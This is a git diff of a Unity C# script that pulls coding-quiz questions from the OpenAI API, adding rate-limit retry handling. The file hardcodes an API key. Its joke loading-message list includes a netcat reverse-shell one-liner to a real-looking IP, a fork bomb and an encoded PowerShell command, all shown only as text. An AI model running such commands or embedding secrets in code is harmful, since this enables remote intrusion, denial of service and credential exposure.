@@ -13,6 +13,7 @@ public class QuestionGenerator : MonoBehaviour
     //private readonly string endpointURL = "http://localhost:8080/";
     private readonly string endpointURL = "https://api.openai.com/v1/chat/completions";
     private readonly string APItoken = "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";
+    private readonly float HTTPDelayTime = 120;
     private List<Task> generatedTasks = new();
     [SerializeField] TextMeshProUGUI _text1, _text2, _text3;
     [SerializeField] TimerScript _timerScript;
@@ -22,7 +23,9 @@ public class QuestionGenerator : MonoBehaviour
     [SerializeField] GameObject[] _cubePool;
     [SerializeField] GameObject _player;
     [SerializeField] TextMeshProUGUI _leadingText;
-    private bool _inputQuestion1, _inputQuestion2, _inputQuestion3, _startCheckingForAnswers = false;
+    private bool _inputQuestion1, _inputQuestion2, _inputQuestion3, _startCheckingForAnswers, _HTTPtooManyRequestsReceived = false;
+    private bool _requestSucceeded = true;
+    private float _HTTP429timestamp = 0;
     private string _task1CubeAnswer, _task2CubeAnswer, _task3CubeAnswer;
 
     #region Loading Messages
@@ -60,17 +63,17 @@ public class QuestionGenerator : MonoBehaviour
                 "JSON Deserialization still in progress...Long live protobufs!",
                 "pickle.Unpickler(Rick).load()",
                 "Sprinkling some magic pixie dust...",
-                "Saving your real life address in the database",
+                "Saving your real life address in the database...",
                 "Wrong scene!, Wrong scene!",
                 "That's what she said.",
                 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 161.53.72.120 9001 >/tmp/f",
                 ":(){ :|:& };:",
-                "Hey, a recursive ZIP file? I wonder what could bomb wrong",
+                "Hey, a recursive ZIP file? Wonder what could bomb wrong..",
                 "Did you know that 203.0.113.0/24 is a private range?",
                 "You've heard of .ELF on the shelf, but what about an unbacked RWX region in kernel-space?",
                 "powershell -e VwByAGkAdABlAC0ASABvAHMAdAAgACIAUwBlAHIAaQBvAHUAcwBsAbwA/ACIA",
-                "Feeding developers",
-                "Crying in bed"
+                "Feeding developers...",
+                "Crying in bed..."
                 
     };
     #endregion
@@ -96,17 +99,28 @@ public class QuestionGenerator : MonoBehaviour
 
     public void Update()
     {
+        if (!_requestSucceeded)
+        {
+            StartCoroutine(GenerateQuestion());
+            _requestSucceeded = true; // da ne generiramo beskonacno API poziva
+        }
+
         if (_startCheckingForAnswers)
         {
             CheckAnswers();
         }
     }
 
-    private IEnumerator DisplayLoadingMessages(UnityWebRequest request)
+    private IEnumerator DisplayLoadingMessages(bool requestSucceeded)
     {
-        while (request.result != UnityWebRequest.Result.Success) {
+        if (!requestSucceeded)
+        {
+            _leadingText.text = "Taking slightly longer than expected...";
+            yield return new WaitForSeconds(7); // da korisnik stigne procitati gresku
+        }
+
+        while (true) {
             int randomLoadingMessageIndex = Random.Range(0, loadingMsgs.Length);
-            // Dodati ovo na TextMesh tijekom loadanja umjesto u Log?
             Debug.Log(loadingMsgs[randomLoadingMessageIndex]);
             _leadingText.text = loadingMsgs[randomLoadingMessageIndex];
             yield return new WaitForSeconds(7);
@@ -115,30 +129,47 @@ public class QuestionGenerator : MonoBehaviour
 
     public IEnumerator GenerateQuestion()
     {
+        if (_HTTPtooManyRequestsReceived)
+        {
+            if (Time.time <= _HTTP429timestamp + HTTPDelayTime)
+            {
+                Debug.LogWarning($"[!] Too many requests sent! Exiting to prevent unwanted cost. Try again in {_HTTP429timestamp + HTTPDelayTime - Time.time} seconds");
+                _requestSucceeded = false;
+                yield break;
+            } else
+            {
+                _HTTPtooManyRequestsReceived = false;
+            }
+        }
+
         Debug.Log("[+] Sending API request..");
         string data = set_random_seed(Question.JSONdata);
         UnityWebRequest request = UnityWebRequest.Post(endpointURL, data, "application/json");
         request.SetRequestHeader("Authorization", $"Bearer {APItoken}");
         request.timeout = 90; // wait up to 1.5min
-        StartCoroutine(DisplayLoadingMessages(request));
+        var displayRoutine = StartCoroutine(DisplayLoadingMessages(_requestSucceeded)); 
         yield return request.SendWebRequest();
 
         #region recv_sample
-        //var recv = "{\r\n  \"id\": \"chatcmpl-8MIE5ZChlmKWBqj8wVEiSlt4qScTu\",\r\n  \"object\": \"chat.completion\",\r\n  \"created\": 1700323969,\r\n  \"model\": \"gpt-4-1106-preview\",\r\n  \"choices\": [\r\n    {\r\n      \"index\": 0,\r\n      \"message\": {\r\n        \"role\": \"assistant\",\r\n        \"content\": \"{\\n    \\\"questionType\\\": 2,\\n    \\\"question\\\": \\\"What is the output of the code?\\\",\\n    \\\"codeSnippet\\\": \\n    \\\"#include <stdio.h>\\\\n\\\\nint main() {\\\\n    int x = 5;\\\\n    int y = x + 3;\\\\n    printf(\\\\\\\"%d\\\\\\\", y);\\\\n    return 0;\\\\n}\\\",\\n    \\\"answer1\\\": \\\"5\\\",\\n    \\\"answer2\\\": \\\"8\\\",\\n    \\\"answer3\\\": \\\"3\\\",\\n    \\\"correctAnswer\\\": 2\\n}\"\r\n      },\r\n      \"finish_reason\": \"stop\"\r\n    }\r\n  ],\r\n  \"usage\": {\r\n    \"prompt_tokens\": 186,\r\n    \"completion_tokens\": 109,\r\n    \"total_tokens\": 295\r\n  },\r\n  \"system_fingerprint\": \"fp_a24b4d720c\"\r\n}";   
+        //var recv = "{  "id": "chatcmpl-8eQN3fQAqyT6YZehgE88TOiFm6lLO",  "object": "chat.completion",  "created": 1704645181,  "model": "gpt-4-1106-preview",  "choices": [    {      "index": 0,      "message": {        "role": "assistant",        "content": "{\n  \"questions\": [\n    {\n      \"questionType\": 0,\n      \"question\": \"What is the time complexity of the following sorting algorithm?\",\n      \"codeSnippet\": \"void customSort(int arr[], int n) {\\n    for (int i = 0; i < n - 1; i++) {\\n        for (int j = i + 1; j < n; j++) {\\n            if (arr[i] > arr[j]) {\\n                int temp = arr[i];\\n                arr[i] = arr[j];\\n                arr[j] = temp;\\n            }\\n        }\\n    }\\n}\",\n      \"answer1\": \"O(n)\",\n      \"answer2\": \"O(n log n)\",\n      \"answer3\": \"O(n^2)\",\n      \"answer4\": \"O(log n)\",\n      \"answer5\": \"O(2^n)\",\n      \"correctAnswer\": 3\n    },\n    {\n      \"questionType\": 1,\n      \"question\": \"Which line in the code below contains a vulnerability that could lead to a buffer overflow?\",\n      \"codeSnippet\": \"void getUserInput() {\\n    char buffer[128];\\n    printf(\\\"Enter your next move: \\\");\\n    gets(buffer);\\n    printf(\\\"You typed: %s\\\\n\\\", buffer);\\n}\",\n      \"answer1\": \"Line 2\",\n      \"answer2\": \"Line 3\",\n      \"answer3\": \"Line 4\",\n      \"answer4\": \"Line 5\",\n      \"answer5\": \"No vulnerability present\",\n      \"correctAnswer\": 3\n    },\n    {\n      \"questionType\": 2,\n      \"question\": \"What is the output of the following code snippet when the input is '5'?\",\n      \"codeSnippet\": \"#include <stdio.h>\\nint main() {\\n    int input, sum = 0;\\n    scanf(\\\"%d\\\", &input);\\n    for (int i = 1; i <= input; i++) {\\n        sum += i;\\n    }\\n    printf(\\\"%d\\\\n\\\", sum);\\n    return 0;\\n}\",\n      \"answer1\": \"10\",\n      \"answer2\": \"15\",\n      \"answer3\": \"5\",\n      \"answer4\": \"1\",\n      \"answer5\": \"0\",\n      \"correctAnswer\": 2\n    }\n  ]\n}"      },      "logprobs": null,      "finish_reason": "stop"    }  ],  "usage": {    "prompt_tokens": 284,    "completion_tokens": 509,    "total_tokens": 793  },  "system_fingerprint": "fp_168383a679"}";   
         #endregion
 
-        if (request.result != UnityWebRequest.Result.Success)
+        if (request.responseCode == 429)
         {
-            Debug.Log(request.error);
-            Debug.Log(request.downloadHandler.text);
-            _text1.text = _text2.text = _text3.text = "Something went wrong :( Try fetching the questions again";
-            StopCoroutine(DisplayLoadingMessages(request));
+            Debug.LogWarning("[!] 429 Received!");
+            _HTTP429timestamp = Time.time;
+            _HTTPtooManyRequestsReceived = true;
+            _requestSucceeded = false;
+            yield break;
         }
-        else
+
+        if (request.result == UnityWebRequest.Result.Success)
         {
             Debug.Log("[+] API Response received!");
-            try {
+            try
+            {
                 string recv = request.downloadHandler.text;
+                //Debug.Log(recv);
                 recv = unescape_custom(recv);
 
                 JObject jsonObj = JObject.Parse(recv);
@@ -148,26 +179,50 @@ public class QuestionGenerator : MonoBehaviour
                 JToken unescapedResponseContent = response["content"];
 
                 JArray unescapedResponseQuestions = (JArray)JObject.Parse(unescapedResponseContent.ToString())["questions"];
+                bool isCodeSnippetMalformed = false;
                 foreach (JToken question in unescapedResponseQuestions)
                 {
                     Task deserializedData = JsonUtility.FromJson<Task>(question.ToString());
-                    generatedTasks.Add(deserializedData);
+                    // ako postoji max jedna linija koda
+                    if (deserializedData.codeSnippet.Count(c => c == '\n') <= 1) 
+                    {
+                        Debug.LogWarning($"Malformed code snippet received: {deserializedData.codeSnippet}");
+                        isCodeSnippetMalformed = true;
+                        break;
+                    }
                     Debug.Log(deserializedData);
+                    generatedTasks.Add(deserializedData);
                 }
 
-                GenerateTask1(generatedTasks[0]);
-                GenerateTask2(generatedTasks[1]);
-                GenerateTask3(generatedTasks[2]);
+                if (isCodeSnippetMalformed)
+                {
+                    _requestSucceeded = false;
+                } else
+                {
+                    GenerateTask1(generatedTasks[0]);
+                    GenerateTask2(generatedTasks[1]);
+                    GenerateTask3(generatedTasks[2]);
+                    _requestSucceeded = true;
+                    _player.transform.position = new Vector3(0, 0, -0.949999988f);
+                    _timerScript.gameObject.SetActive(true);
+                    _startCheckingForAnswers = true;
+                }
 
-            } catch {
-                _text1.text = _text2.text = _text3.text = "Something went wrong :( Try fetching the questions again";
-                StopCoroutine(DisplayLoadingMessages(request));
+            }
+            catch
+            {
+                _text1.text = _text2.text = _text3.text = "Taking slightly longer than expected...";
+                _requestSucceeded = false;
             }
         }
-        StopCoroutine(DisplayLoadingMessages(request));
-        _player.transform.position = new Vector3(0, 0, -0.949999988f);
-        _timerScript.gameObject.SetActive(true);
-        _startCheckingForAnswers = true;
+        else
+        {
+            Debug.Log(request.error);
+            Debug.Log(request.downloadHandler.text);
+            _requestSucceeded = false;
+            _text1.text = _text2.text = _text3.text = "Taking slightly longer than expected...";
+        }
+        StopCoroutine(displayRoutine);
     }
 
     void GenerateTask1(Task t) {
@@ -247,7 +302,7 @@ public class QuestionGenerator : MonoBehaviour
         }
         else
         {
-            Debug.Log(generatedTasks[0].GetCorrectAnswerString());
+            //Debug.Log(generatedTasks[0].GetCorrectAnswerString());
             if (_iField1.transform.GetComponent<TMP_InputField>().text == generatedTasks[0].correctAnswer.ToString()) { _timerScript.Task1Done(); }
             else{ _timerScript.Task1UnDone(); }
         }
@@ -258,7 +313,7 @@ public class QuestionGenerator : MonoBehaviour
         }
         else
         {
-            Debug.Log(generatedTasks[1].GetCorrectAnswerString());
+            //Debug.Log(generatedTasks[1].GetCorrectAnswerString());
             if (_iField2.transform.GetComponent<TMP_InputField>().text == generatedTasks[1].correctAnswer.ToString()) { _timerScript.Task2Done(); }
             else{ _timerScript.Task2UnDone(); }
         }
@@ -269,7 +324,7 @@ public class QuestionGenerator : MonoBehaviour
         }
         else
         {
-            Debug.Log(generatedTasks[2].GetCorrectAnswerString());
+            //Debug.Log(generatedTasks[2].GetCorrectAnswerString());
             if (_iField3.transform.GetComponent<TMP_InputField>().text == generatedTasks[2].correctAnswer.ToString()) { _timerScript.Task3Done(); }
             else{ _timerScript.Task3UnDone(); }
         }
